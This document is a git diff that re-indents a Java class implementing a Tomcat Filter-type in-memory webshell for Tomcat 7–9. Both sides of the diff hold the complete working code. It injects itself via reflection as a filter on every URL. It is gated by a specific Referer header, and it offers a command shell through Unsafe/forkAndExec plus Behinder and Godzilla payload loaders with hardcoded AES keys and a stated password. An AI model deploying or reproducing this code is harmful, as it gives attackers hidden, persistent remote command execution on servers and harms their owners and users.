@@ -29,9 +29,8 @@ import java.net.URLClassLoader;
 import java.util.*;
 
 /**
- *
  * 使用线程注入 Tomcat Filter 型内存马
- *
+ * <p>
  * 前提条件：Referer: https://su18.org/
  * X-SSRF-TOKEN 如果为 ce 则执行命令
  * X-SSRF-TOKEN 如果为 bx 则为冰蝎马   密码 su18yyds
@@ -39,320 +38,324 @@ import java.util.*;
  * 适用范围: Tomcat 7 ~ 9
  */
 public class TFMSFromThread implements Filter {
-    static {
-        try {
-            final String name = "su18" + System.nanoTime();
-            final String URLPattern = "/*";
 
-            WebappClassLoaderBase webappClassLoaderBase =
-                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+	static {
+		try {
+			final String name       = "su18" + System.nanoTime();
+			final String URLPattern = "/*";
 
-            Class<? extends StandardContext> aClass = null;
-            try {
-                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
-                aClass.getDeclaredField("filterConfigs");
-            } catch (Exception e) {
-                aClass = standardContext.getClass();
-                aClass.getDeclaredField("filterConfigs");
-            }
-            Field Configs = aClass.getDeclaredField("filterConfigs");
-            Configs.setAccessible(true);
-            Map filterConfigs = (Map) Configs.get(standardContext);
+			WebappClassLoaderBase webappClassLoaderBase =
+					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+			StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
-            TFMSFromThread behinderFilter = new TFMSFromThread();
+			Class<? extends StandardContext> aClass = null;
+			try {
+				aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
+				aClass.getDeclaredField("filterConfigs");
+			} catch (Exception e) {
+				aClass = standardContext.getClass();
+				aClass.getDeclaredField("filterConfigs");
+			}
+			Field Configs = aClass.getDeclaredField("filterConfigs");
+			Configs.setAccessible(true);
+			Map filterConfigs = (Map) Configs.get(standardContext);
 
-            FilterDef filterDef = new FilterDef();
-            filterDef.setFilter(behinderFilter);
-            filterDef.setFilterName(name);
-            filterDef.setFilterClass(behinderFilter.getClass().getName());
+			TFMSFromThread behinderFilter = new TFMSFromThread();
 
-            standardContext.addFilterDef(filterDef);
+			FilterDef filterDef = new FilterDef();
+			filterDef.setFilter(behinderFilter);
+			filterDef.setFilterName(name);
+			filterDef.setFilterClass(behinderFilter.getClass().getName());
 
-            FilterMap filterMap = new FilterMap();
-            filterMap.addURLPattern(URLPattern);
-            filterMap.setFilterName(name);
-            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+			standardContext.addFilterDef(filterDef);
 
-            standardContext.addFilterMapBefore(filterMap);
+			FilterMap filterMap = new FilterMap();
+			filterMap.addURLPattern(URLPattern);
+			filterMap.setFilterName(name);
+			filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
-            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
-            constructor.setAccessible(true);
-            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+			standardContext.addFilterMapBefore(filterMap);
 
-            filterConfigs.put(name, filterConfig);
-        } catch (Exception ignored) {
-        }
-    }
+			Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+			constructor.setAccessible(true);
+			ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
 
-    String xc = "7ff9fe91aaa7d3aa"; // key
-    String pass = "su18";
-    String md5 = md5(pass + xc);
-    Class payload;
+			filterConfigs.put(name, filterConfig);
+		} catch (Exception ignored) {
+		}
+	}
 
-    public static String md5(String s) {
-        String ret = null;
-        try {
-            java.security.MessageDigest m;
-            m = java.security.MessageDigest.getInstance("MD5");
-            m.update(s.getBytes(), 0, s.length());
-            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
-        } catch (Exception ignored) {
-        }
-        return ret;
-    }
+	String xc   = "7ff9fe91aaa7d3aa"; // key
 
-    public static String base64Encode(byte[] bs) throws Exception {
-        Class base64;
-        String value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
-            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object Encoder = base64.newInstance();
-                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
-            } catch (Exception ignored) {
-            }
-        }
-        return value;
-    }
+	String pass = "su18";
 
-    public static byte[] base64Decode(String bs) throws Exception {
-        Class base64;
-        byte[] value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception e2) {
-            }
-        }
-        return value;
-    }
+	String md5  = md5(pass + xc);
 
-    @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
+	Class  payload;
 
-    }
+	public static String md5(String s) {
+		String ret = null;
+		try {
+			java.security.MessageDigest m;
+			m = java.security.MessageDigest.getInstance("MD5");
+			m.update(s.getBytes(), 0, s.length());
+			ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+		} catch (Exception ignored) {
+		}
+		return ret;
+	}
 
-    @Override
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        HttpServletRequest request = (HttpServletRequest) servletRequest;
-        HttpServletResponse response = (HttpServletResponse) servletResponse;
-        try {
-            // 入口
-            if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
-                Object lastRequest = request;
-                Object lastResponse = response;
-                // 解决包装类RequestWrapper的问题
-                // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
-                if (!(lastRequest instanceof RequestFacade)) {
-                    Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
-                    lastRequest = getRequest.invoke(request);
-                    while (true) {
-                        if (lastRequest instanceof RequestFacade) break;
-                        lastRequest = getRequest.invoke(lastRequest);
-                    }
-                }
-                // 解决包装类ResponseWrapper的问题
-                if (!(lastResponse instanceof ResponseFacade)) {
-                    Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
-                    lastResponse = getResponse.invoke(response);
-                    while (true) {
-                        if (lastResponse instanceof ResponseFacade) break;
-                        lastResponse = getResponse.invoke(lastResponse);
-                    }
-                }
-                // cmdshell
-                if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("ce")) {
-                    String cmd = request.getHeader("X-Token-Data");
-                    if (cmd != null && !cmd.isEmpty()) {
-                        String[] cmds = null;
-                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                            cmds = new String[]{"cmd", "/c", cmd};
-                        } else {
-                            cmds = new String[]{"/bin/bash", "-c", cmd};
-                        }
+	public static String base64Encode(byte[] bs) throws Exception {
+		Class  base64;
+		String value = null;
+		try {
+			base64 = Class.forName("java.util.Base64");
+			Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
+			value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+		} catch (Exception e) {
+			try {
+				base64 = Class.forName("sun.misc.BASE64Encoder");
+				Object Encoder = base64.newInstance();
+				value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+			} catch (Exception ignored) {
+			}
+		}
+		return value;
+	}
 
-                        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
-                        theUnsafeField.setAccessible(true);
-                        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+	public static byte[] base64Decode(String bs) throws Exception {
+		Class  base64;
+		byte[] value = null;
+		try {
+			base64 = Class.forName("java.util.Base64");
+			Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+		} catch (Exception e) {
+			try {
+				base64 = Class.forName("sun.misc.BASE64Decoder");
+				Object decoder = base64.newInstance();
+				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+			} catch (Exception e2) {
+			}
+		}
+		return value;
+	}
 
-                        Class processClass = null;
+	@Override
+	public void init(FilterConfig filterConfig) throws ServletException {
 
-                        try {
-                            processClass = Class.forName("java.lang.UNIXProcess");
-                        } catch (ClassNotFoundException e) {
-                            processClass = Class.forName("java.lang.ProcessImpl");
-                        }
+	}
 
-                        Object processObject = unsafe.allocateInstance(processClass);
+	@Override
+	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+		HttpServletRequest  request  = (HttpServletRequest) servletRequest;
+		HttpServletResponse response = (HttpServletResponse) servletResponse;
+		try {
+			// 入口
+			if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
+				Object lastRequest  = request;
+				Object lastResponse = response;
+				// 解决包装类RequestWrapper的问题
+				// 详细描述见 https://github.com/rebeyond/Behinder/issues/187
+				if (!(lastRequest instanceof RequestFacade)) {
+					Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
+					lastRequest = getRequest.invoke(request);
+					while (true) {
+						if (lastRequest instanceof RequestFacade) break;
+						lastRequest = getRequest.invoke(lastRequest);
+					}
+				}
+				// 解决包装类ResponseWrapper的问题
+				if (!(lastResponse instanceof ResponseFacade)) {
+					Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
+					lastResponse = getResponse.invoke(response);
+					while (true) {
+						if (lastResponse instanceof ResponseFacade) break;
+						lastResponse = getResponse.invoke(lastResponse);
+					}
+				}
+				// cmdshell
+				if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("ce")) {
+					String cmd = request.getHeader("X-Token-Data");
+					if (cmd != null && !cmd.isEmpty()) {
+						String[] cmds = null;
+						if (System.getProperty("os.name").toLowerCase().contains("win")) {
+							cmds = new String[]{"cmd", "/c", cmd};
+						} else {
+							cmds = new String[]{"/bin/bash", "-c", cmd};
+						}
 
-                        byte[][] args = new byte[cmds.length - 1][];
-                        int      size = args.length;
+						Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+						theUnsafeField.setAccessible(true);
+						Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
 
-                        for (int i = 0; i < args.length; i++) {
-                            args[i] = cmds[i + 1].getBytes();
-                            size += args[i].length;
-                        }
+						Class processClass = null;
 
-                        byte[] argBlock = new byte[size];
-                        int    i        = 0;
+						try {
+							processClass = Class.forName("java.lang.UNIXProcess");
+						} catch (ClassNotFoundException e) {
+							processClass = Class.forName("java.lang.ProcessImpl");
+						}
 
-                        for (byte[] arg : args) {
-                            System.arraycopy(arg, 0, argBlock, i, arg.length);
-                            i += arg.length + 1;
-                        }
+						Object processObject = unsafe.allocateInstance(processClass);
 
-                        int[] envc                 = new int[1];
-                        int[] std_fds              = new int[]{-1, -1, -1};
-                        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
-                        Field helperpathField      = processClass.getDeclaredField("helperpath");
-                        launchMechanismField.setAccessible(true);
-                        helperpathField.setAccessible(true);
-                        Object launchMechanismObject = launchMechanismField.get(processObject);
-                        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
+						byte[][] args = new byte[cmds.length - 1][];
+						int      size = args.length;
 
-                        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+						for (int i = 0; i < args.length; i++) {
+							args[i] = cmds[i + 1].getBytes();
+							size += args[i].length;
+						}
 
-                        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
-                            byte[].class, int.class, byte[].class, int[].class, boolean.class);
+						byte[] argBlock = new byte[size];
+						int    i        = 0;
 
-                        forkMethod.setAccessible(true);//
+						for (byte[] arg : args) {
+							System.arraycopy(arg, 0, argBlock, i, arg.length);
+							i += arg.length + 1;
+						}
 
-                        forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
-                            null, envc[0], null, std_fds, false);
+						int[] envc                 = new int[1];
+						int[] std_fds              = new int[]{-1, -1, -1};
+						Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+						Field helperpathField      = processClass.getDeclaredField("helperpath");
+						launchMechanismField.setAccessible(true);
+						helperpathField.setAccessible(true);
+						Object launchMechanismObject = launchMechanismField.get(processObject);
+						byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
 
-                        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
-                        initStreamsMethod.setAccessible(true);
-                        initStreamsMethod.invoke(processObject, std_fds);
+						int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
 
-                        Method getInputStreamMethod = processClass.getMethod("getInputStream");
-                        getInputStreamMethod.setAccessible(true);
-                        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
+						Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
+								byte[].class, int.class, byte[].class, int[].class, boolean.class);
 
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        int                   a    = 0;
-                        byte[]                b    = new byte[1024];
+						forkMethod.setAccessible(true);//
 
-                        while ((a = in.read(b)) != -1) {
-                            baos.write(b, 0, a);
-                        }
+						forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
+								null, envc[0], null, std_fds, false);
 
-                        ((ResponseFacade) lastResponse).getWriter().println(baos);
-                    }
-                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("bx")) {
-                    if (request.getMethod().equals("POST")) {
-                        // 创建pageContext
-                        HashMap pageContext = new HashMap();
+						Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
+						initStreamsMethod.setAccessible(true);
+						initStreamsMethod.invoke(processObject, std_fds);
 
-                        // lastRequest的session是没有被包装的session!!
-                        HttpSession session = ((RequestFacade) lastRequest).getSession();
-                        pageContext.put("request", lastRequest);
-                        pageContext.put("response", lastResponse);
-                        pageContext.put("session", session);
-                        // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
-                        StringBuilder payload = new StringBuilder(request.getReader().readLine());
-                        if (payload == null || (payload.length() == 0)) {
-                            payload = new StringBuilder();
-                            // 拿到真实的Request对象而非门面模式的RequestFacade
-                            Field field = lastRequest.getClass().getDeclaredField("request");
-                            field.setAccessible(true);
-                            Request realRequest = (Request) field.get(lastRequest);
-                            // 从coyoteRequest中拼接body参数
-                            Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
-                            coyoteRequestField.setAccessible(true);
-                            org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
-                            Parameters parameters = coyoteRequest.getParameters();
-                            Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
-                            paramHashValues.setAccessible(true);
-                            LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);
+						Method getInputStreamMethod = processClass.getMethod("getInputStream");
+						getInputStreamMethod.setAccessible(true);
+						InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
 
-                            Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
-                            while (iterator.hasNext()) {
-                                Map.Entry<String, ArrayList<String>> next = iterator.next();
-                                String paramKey = next.getKey().replaceAll(" ", "+");
-                                ArrayList<String> paramValueList = next.getValue();
-                                if (paramValueList.size() == 0) {
-                                    payload.append(paramKey);
-                                } else {
-                                    payload.append(paramKey).append("=").append(paramValueList.get(0));
-                                }
-                            }
-                        }
+						ByteArrayOutputStream baos = new ByteArrayOutputStream();
+						int                   a    = 0;
+						byte[]                b    = new byte[1024];
+
+						while ((a = in.read(b)) != -1) {
+							baos.write(b, 0, a);
+						}
+
+						((ResponseFacade) lastResponse).getWriter().println(baos);
+					}
+				} else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("bx")) {
+					if (request.getMethod().equals("POST")) {
+						// 创建pageContext
+						HashMap pageContext = new HashMap();
+
+						// lastRequest的session是没有被包装的session!!
+						HttpSession session = ((RequestFacade) lastRequest).getSession();
+						pageContext.put("request", lastRequest);
+						pageContext.put("response", lastResponse);
+						pageContext.put("session", session);
+						// 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
+						StringBuilder payload = new StringBuilder(request.getReader().readLine());
+						if (payload == null || (payload.length() == 0)) {
+							payload = new StringBuilder();
+							// 拿到真实的Request对象而非门面模式的RequestFacade
+							Field field = lastRequest.getClass().getDeclaredField("request");
+							field.setAccessible(true);
+							Request realRequest = (Request) field.get(lastRequest);
+							// 从coyoteRequest中拼接body参数
+							Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
+							coyoteRequestField.setAccessible(true);
+							org.apache.coyote.Request coyoteRequest   = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
+							Parameters                parameters      = coyoteRequest.getParameters();
+							Field                     paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
+							paramHashValues.setAccessible(true);
+							LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);
+
+							Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
+							while (iterator.hasNext()) {
+								Map.Entry<String, ArrayList<String>> next           = iterator.next();
+								String                               paramKey       = next.getKey().replaceAll(" ", "+");
+								ArrayList<String>                    paramValueList = next.getValue();
+								if (paramValueList.size() == 0) {
+									payload.append(paramKey);
+								} else {
+									payload.append(paramKey).append("=").append(paramValueList.get(0));
+								}
+							}
+						}
 
 //                        System.out.println(payload);
-                        // 冰蝎逻辑
-                        String k = "7ff9fe91aaa7d3aa"; // rebeyond
-                        session.putValue("u", k);
-                        Cipher c = Cipher.getInstance("AES");
-                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
-                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                        method.setAccessible(true);
-                        byte[] evilclass_byte = c.doFinal(base64Decode(payload.toString()));
-                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
-                        evilclass.newInstance().equals(pageContext);
-                    }
-                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("gz")) {
-                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
-                    byte[] data = base64Decode(request.getParameter(pass));
-                    data = x(data, false);
-                    if (payload == null) {
-                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
-                        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                        defMethod.setAccessible(true);
-                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
-                    } else {
-                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
-                        Object f = payload.newInstance();
-                        f.equals(arrOut);
-                        f.equals(data);
-                        f.equals(request);
-                        response.getWriter().write(md5.substring(0, 16));
-                        f.toString();
-                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
-                        response.getWriter().write(md5.substring(16));
-                    }
-                }
-                return;
-            }
-        } catch (Exception ignored) {
-        }
-        filterChain.doFilter(servletRequest, servletResponse);
-    }
+						// 冰蝎逻辑
+						String k = "7ff9fe91aaa7d3aa"; // rebeyond
+						session.putValue("u", k);
+						Cipher c = Cipher.getInstance("AES");
+						c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+						Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+						method.setAccessible(true);
+						byte[] evilclass_byte = c.doFinal(base64Decode(payload.toString()));
+						Class  evilclass      = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
+						evilclass.newInstance().equals(pageContext);
+					}
+				} else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("gz")) {
+					// 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
+					byte[] data = base64Decode(request.getParameter(pass));
+					data = x(data, false);
+					if (payload == null) {
+						URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
+						Method         defMethod      = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+						defMethod.setAccessible(true);
+						payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
+					} else {
+						java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+						Object                        f      = payload.newInstance();
+						f.equals(arrOut);
+						f.equals(data);
+						f.equals(request);
+						response.getWriter().write(md5.substring(0, 16));
+						f.toString();
+						response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
+						response.getWriter().write(md5.substring(16));
+					}
+				}
+				return;
+			}
+		} catch (Exception ignored) {
+		}
+		filterChain.doFilter(servletRequest, servletResponse);
+	}
 
-    public byte[] x(byte[] s, boolean m) {
-        try {
-            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
-            return c.doFinal(s);
-        } catch (Exception e) {
-            return null;
-        }
-    }
+	public byte[] x(byte[] s, boolean m) {
+		try {
+			javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+			c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
+			return c.doFinal(s);
+		} catch (Exception e) {
+			return null;
+		}
+	}
 
-    public byte[] toCString(String s) {
-        if (s == null)
-            return null;
-        byte[] bytes  = s.getBytes();
-        byte[] result = new byte[bytes.length + 1];
-        System.arraycopy(bytes, 0,
-            result, 0,
-            bytes.length);
-        result[result.length - 1] = (byte) 0;
-        return result;
-    }
+	public byte[] toCString(String s) {
+		if (s == null)
+			return null;
+		byte[] bytes  = s.getBytes();
+		byte[] result = new byte[bytes.length + 1];
+		System.arraycopy(bytes, 0,
+				result, 0,
+				bytes.length);
+		result[result.length - 1] = (byte) 0;
+		return result;
+	}
 
-    @Override
-    public void destroy() {
+	@Override
+	public void destroy() {
 
-    }
+	}
 }
